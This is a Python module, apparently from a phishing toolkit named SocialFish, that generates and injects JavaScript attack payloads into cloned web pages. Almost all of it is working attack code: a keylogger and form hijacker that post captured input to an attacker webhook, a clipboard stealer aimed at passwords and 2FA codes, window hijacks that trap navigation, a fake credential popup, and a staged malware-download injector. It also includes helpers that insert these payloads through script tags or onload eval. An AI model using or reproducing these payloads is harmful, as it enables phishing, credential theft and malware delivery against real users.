#!/usr/bin/env python3
"""
Advanced Attack Capabilities for SocialFish v3.0
Tab Jacking, File Upload Injection, Post-Capture Redirect
"""

import json
import random
import string
from typing import Dict, Optional
from pathlib import Path

class AdvancedAttackInjector:
    """Inject and deliver advanced attack payloads"""
    
    @staticmethod
    def generate_tab_jacker(redirect_url: str, target_window_name: str = '_blank', delay_ms: int = 500) -> str:
        """
        Generate tab jacking JavaScript injection
        Steals focus using window.open() tricks and name manipulation
        """
        payload = f"""
        (function() {{
            try {{
                // Store reference to current window
                var originalOpener = window.opener;
                var hijackedWindow = window;
                
                // Inject into all window.open calls
                var WindowOpen = window.open;
                window.open = function(url, target, features) {{
                    // Intercept opens
                    target = target || '_blank';
                    var w = WindowOpen.call(this, '{redirect_url}', target, features);
                    return w;
                }};
                
                // Grab focus after delay
                setTimeout(function() {{
                    try {{
                        window.location = '{redirect_url}';
                    }} catch(e) {{
                        window.open('{redirect_url}', '{target_window_name}');
                    }}
                }}, {delay_ms});
                
            }} catch(e) {{}}
        }})();
        """
        return payload
    
    @staticmethod
    def generate_window_hijack(redirect_url: str) -> str:
        """
        Aggressive window hijacking - best for same-origin scenarios
        """
        payload = f"""
        (function() {{
            try {{
                // Override window.location (catches most redirect attempts)
                Object.defineProperty(window, 'location', {{
                    get: function() {{
                        var LocationBar = function() {{
                            this.href = '{redirect_url}';
                        }};
                        return new LocationBar();
                    }},
                    set: function(url) {{
                        // Silently redirect
                        setTimeout(function() {{
                            window.location.href = '{redirect_url}';
                        }}, 100);
                    }},
                    configurable: true
                }});
                
                // Override history to prevent back navigation
                window.onpopstate = function() {{
                    window.location.href = '{redirect_url}';
                }};
                
                // Prevent page unload
                window.onbeforeunload = function() {{
                    return false;
                }};
                
            }} catch(e) {{}}
        }})();
        """
        return payload
    
    @staticmethod
    def generate_fake_logout(capture_url: str, logout_text: str = 'Click here to continue') -> str:
        """
        Inject fake logout button that redirects to capture page
        """
        payload = f"""
        (function() {{
            try {{
                var navbar = document.querySelector('nav') || document.querySelector('header');
                
                if (navbar) {{
                    var logout_btn = document.createElement('button');
                    logout_btn.innerHTML = '{logout_text}';
                    logout_btn.style.cssText = `
                        position: fixed;
                        bottom: 20px;
                        right: 20px;
                        padding: 10px 20px;
                        background: #007bff;
                        color: white;
                        border: none;
                        border-radius: 5px;
                        cursor: pointer;
                        z-index: 99999;
                        font-weight: bold;
                    `;
                    
                    logout_btn.onclick = function(e) {{
                        e.preventDefault();
                        window.location.href = '{capture_url}';
                    }};
                    
                    document.body.appendChild(logout_btn);
                }}
            }} catch(e) {{}}
        }})();
        """
        return payload
    
    @staticmethod
    def generate_clipboard_stealer() -> str:
        """
        Attempt to steal clipboard content (2FA codes, passwords)
        Requires user permission in most modern browsers
        """
        payload = """
        (function() {
            try {
                navigator.clipboard.readText()
                .then(text => {
                    // Send to attacker server
                    fetch('/api/webhook', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            type: 'clipboard',
                            content: text,
                            timestamp: new Date().toISOString()
                        })
                    }).catch(e => {});
                })
                .catch(e => {});
            } catch(e) {}
        })();
        """
        return payload
    
    @staticmethod
    def generate_keylogger(webhook_url: str = '/api/webhook') -> str:
        """
        Inject keylogger for capturing credential input
        """
        payload = f"""
        (function() {{
            var captured = {{}};
            
            document.addEventListener('keyup', function(e) {{
                var elem = e.target;
                if (elem.tagName === 'INPUT' || elem.tagName === 'TEXTAREA') {{
                    var name = elem.getAttribute('name') || elem.getAttribute('id') || 'unknown';
                    if (!captured[name]) captured[name] = '';
                    captured[name] += e.key;
                    
                    // Auto-send on form submission
                    if (e.key === 'Enter') {{
                        fetch('{webhook_url}', {{
                            method: 'POST',
                            headers: {{'Content-Type': 'application/json'}},
                            body: JSON.stringify({{
                                type: 'keystroke',
                                data: captured,
                                timestamp: new Date().toISOString()
                            }})
                        }}).catch(() => {{}});
                    }}
                }}
            }});
        }})();
        """
        return payload
    
    @staticmethod
    def generate_file_download_injection(file_url: str, filename: str = 'document.pdf') -> str:
        """
        Inject JavaScript to trigger automatic file download
        Useful for spreading malware or creating false sense of completion
        """
        payload = f"""
        (function() {{
            try {{
                var link = document.createElement('a');
                link.href = '{file_url}';
                link.download = '{filename}';
                link.style.display = 'none';
                document.body.appendChild(link);
                
                // Trigger download
                setTimeout(function() {{
                    link.click();
                    document.body.removeChild(link);
                }}, 1000);
            }} catch(e) {{}}
        }})();
        """
        return payload
    
    @staticmethod
    def generate_form_hijack(attacker_url: str) -> str:
        """
        Hijack all form submissions to send to attacker's server
        """
        payload = f"""
        (function() {{
            var originalSubmit = HTMLFormElement.prototype.submit;
            HTMLFormElement.prototype.submit = function() {{
                var formData = new FormData(this);
                var data = {{}};
                formData.forEach((value, key) => {{
                    data[key] = value;
                }});
                
                // Send to attacker
                fetch('{attacker_url}', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        type: 'form_data',
                        submitted_data: data,
                        url: window.location.href,
                        timestamp: new Date().toISOString()
                    }})
                }}).catch(() => {{}});
                
                // Continue with original submission
                try {{
                    originalSubmit.call(this);
                }} catch(e) {{}}
            }};
        }})();
        """
        return payload
    
    @staticmethod
    def generate_phishing_popup(title: str, message: str, button_text: str = 'Confirm') -> str:
        """
        Generate fake security warning popup
        """
        payload = f"""
        (function() {{
            try {{
                var overlay = document.createElement('div');
                overlay.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0,0,0,0.5);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    z-index: 999999;
                `;
                
                var popup = document.createElement('div');
                popup.style.cssText = `
                    background: white;
                    padding: 40px;
                    border-radius: 10px;
                    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
                    max-width: 500px;
                    text-align: center;
                    font-family: Arial, sans-serif;
                `;
                
                popup.innerHTML = `
                    <h2 style="color: #d32f2f; margin-bottom: 20px;">{title}</h2>
                    <p style="color: #333; margin-bottom: 30px; font-size: 14px;">{message}</p>
                    <button onclick="this.parentElement.parentElement.remove()" style="
                        background: #1976d2;
                        color: white;
                        padding: 10px 30px;
                        border: none;
                        border-radius: 5px;
                        cursor: pointer;
                        font-size: 16px;
                    ">{button_text}</button>
                `;
                
                overlay.appendChild(popup);
                document.body.appendChild(overlay);
            }} catch(e) {{}}
        }})();
        """
        return payload


class FileUploadServer:
    """Handle file serving for download injection attacks"""
    
    def __init__(self, upload_dir: str = './uploads/malware'):
        self.upload_dir = Path(upload_dir)
        self.upload_dir.mkdir(parents=True, exist_ok=True)
    
    def stage_file(self, file_path: str, stage_name: str = None) -> str:
        """
        Stage a file for delivery
        Returns URL path for injection
        """
        if not stage_name:
            stage_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        
        dest = self.upload_dir / stage_name
        
        try:
            with open(file_path, 'rb') as src:
                with open(dest, 'wb') as dst:
                    dst.write(src.read())
            
            print(f"[+] File staged: {stage_name}")
            return f"/uploads/malware/{stage_name}"
        except Exception as e:
            print(f"[-] File staging error: {e}")
            return None
    
    def generate_download_url(self, stage_path: str, custom_filename: str = None) -> str:
        """Generate the download injection payload"""
        if not custom_filename:
            custom_filename = 'document.pdf'
        
        return AdvancedAttackInjector.generate_file_download_injection(
            stage_path,
            custom_filename
        )


class AttackTemplateBuilder:
    """Build complete attack templates combining multiple techniques"""
    
    @staticmethod
    def build_aggressive_redirect(capture_page_url: str) -> Dict[str, str]:
        """Complete aggressive redirect attack"""
        return {
            'tab_jack': AdvancedAttackInjector.generate_tab_jacker(capture_page_url),
            'window_hijack': AdvancedAttackInjector.generate_window_hijack(capture_page_url),
            'fake_logout': AdvancedAttackInjector.generate_fake_logout(capture_page_url),
            'form_hijack': AdvancedAttackInjector.generate_form_hijack(capture_page_url)
        }
    
    @staticmethod
    def build_credential_stealer(webhook_url: str) -> Dict[str, str]:
        """Complete credential theft attack"""
        return {
            'keylogger': AdvancedAttackInjector.generate_keylogger(webhook_url),
            'form_hijack': AdvancedAttackInjector.generate_form_hijack(webhook_url),
            'clipboard': AdvancedAttackInjector.generate_clipboard_stealer(),
            'phishing_popup': AdvancedAttackInjector.generate_phishing_popup(
                'Security Warning',
                'Your session has expired. Please re-enter your credentials to continue.'
            )
        }
    
    @staticmethod
    def build_multi_vector_attack(
        capture_url: str,
        webhook_url: str,
        file_download_url: str = None
    ) -> Dict[str, any]:
        """Complete multi-vector attack combining all techniques"""
        payloads = {
            'redirect': AdvancedAttackInjector.generate_window_hijack(capture_url),
            'keylogger': AdvancedAttackInjector.generate_keylogger(webhook_url),
            'form_hijack': AdvancedAttackInjector.generate_form_hijack(webhook_url),
            'fake_logout': AdvancedAttackInjector.generate_fake_logout(capture_url),
            'clipboard': AdvancedAttackInjector.generate_clipboard_stealer()
        }
        
        if file_download_url:
            payloads['file_download'] = AdvancedAttackInjector.generate_file_download_injection(
                file_download_url,
                'important_document.pdf'
            )
        
        # Combine all payloads
        combined_script = '\n'.join([f"// {name}\n{script}" for name, script in payloads.items()])
        
        return {
            'individual_payloads': payloads,
            'combined_script': combined_script,
            'injection_methods': [
                'html_script_tag',
                'inline_script_tag',
                'dom_manipulation',
                'server_side_injection'
            ]
        }


class InjectionMethods:
    """Different ways to inject payloads into cloned pages"""
    
    @staticmethod
    def html_script_injection(html_content: str, payload: str) -> str:
        """Inject script as HTML tag in <head> or before </body>"""
        # Inject at end of <head>
        if '</head>' in html_content:
            return html_content.replace(
                '</head>',
                f'<script>{payload}</script></head>'
            )
        # Fallback: inject before </body>
        elif '</body>' in html_content:
            return html_content.replace(
                '</body>',
                f'<script>{payload}</script></body>'
            )
        else:
            return html_content + f'\n<script>{payload}</script>'
    
    @staticmethod
    def inline_event_injection(html_content: str, payload: str) -> str:
        """Inject into DOM element events"""
        # Modify body onload
        inline_script = payload.replace('"', '\\"')
        return html_content.replace(
            '<body',
            f'<body onload="eval(\'{inline_script}\')"'
        )
    
    @staticmethod
    def dom_ready_injection(html_content: str, payload: str) -> str:
        """Inject into document ready event"""
        jquery_ready = f"""
        <script>
        if (document.readyState === 'loading') {{
            document.addEventListener('DOMContentLoaded', function() {{{payload}}});
        }} else {{{payload}}}
        </script>
        """
        
        if '</body>' in html_content:
            return html_content.replace('</body>', jquery_ready + '</body>')
        return html_content + jquery_ready



def main():
    """CLI for testing advanced attacks"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Advanced Attack Injector')
    subparsers = parser.add_subparsers(dest='command')
    
    # Tab jack command
    tabjack_parser = subparsers.add_parser('tabjack', help='Generate tab jacking payload')
    tabjack_parser.add_argument('url', help='Redirect URL')
    
    # Keylogger command
    keylog_parser = subparsers.add_parser('keylogger', help='Generate keylogger payload')
    keylog_parser.add_argument('--webhook', default='/api/webhook')
    
    # PDF injection
    pdf_parser = subparsers.add_parser('pdf', help='Generate file download injection')
    pdf_parser.add_argument('url', help='File URL')
    pdf_parser.add_argument('--filename', default='document.pdf')
    
    args = parser.parse_args()
    
    if args.command == 'tabjack':
        print(AdvancedAttackInjector.generate_tab_jacker(args.url))
    elif args.command == 'keylogger':
        print(AdvancedAttackInjector.generate_keylogger(args.webhook))
    elif args.command == 'pdf':
        print(AdvancedAttackInjector.generate_file_download_injection(args.url, args.filename))


if __name__ == '__main__':
    main()

